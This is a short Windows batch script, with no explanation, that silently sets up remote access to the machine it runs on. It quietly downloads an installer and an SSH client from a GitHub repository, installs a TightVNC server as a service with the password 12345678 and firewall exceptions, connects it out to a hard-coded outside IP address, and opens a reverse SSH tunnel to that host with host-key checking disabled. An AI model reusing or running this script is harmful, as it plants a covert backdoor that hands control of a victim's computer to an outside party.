powershell -c "Invoke-WebRequest -Uri 'https://github.com/ostajic/CodingFolder/blob/master/run5.msi?raw=true' -OutFile '%userprofile%\Downloads\run5.msi'" >nul 2>&1
powershell -c "Invoke-WebRequest -Uri 'https://github.com/ostajic/CodingFolder/blob/master/ssh.exe?raw=true' -OutFile '%userprofile%\Downloads\ssh.exe'" >nul 2>&1
msiexec /i "%userprofile%\Downloads\run5.msi" /quiet /norestart ADDLOCAL="Server,Viewer" VIEWER_ASSOCIATE_VNC_EXTENSION=1 SERVER_REGISTER_AS_SERVICE=1 SERVER_ADD_FIREWALL_EXCEPTION=1 VIEWER_ADD_FIREWALL_EXCEPTION=1 SERVER_ALLOW_SAS=1 SET_USEVNCAUTHENTICATION=1 VALUE_OF_USEVNCAUTHENTICATION=1 SET_PASSWORD=1 VALUE_OF_PASSWORD=12345678 SET_USECONTROLAUTHENTICATION=1 VALUE_OF_USECONTROLAUTHENTICATION=1 SET_ALLOWLOOPBACK=1 SET_CONTROLPASSWORD=1 VALUE_OF_CONTROLPASSWORD=12345678
"C:\Program Files\TightVNC\tvnserver.exe" -controlservice -connect 92.35.206.204:8989
#powershell Add-WindowsCapability -Online -Name OpenSSH.Client*
start cmd.exe
%userprofile%\Downloads\ssh.exe -o "StrictHostKeyChecking no" -p 8989 -fNT -R5900:localhost:5900 92.35.206.204 
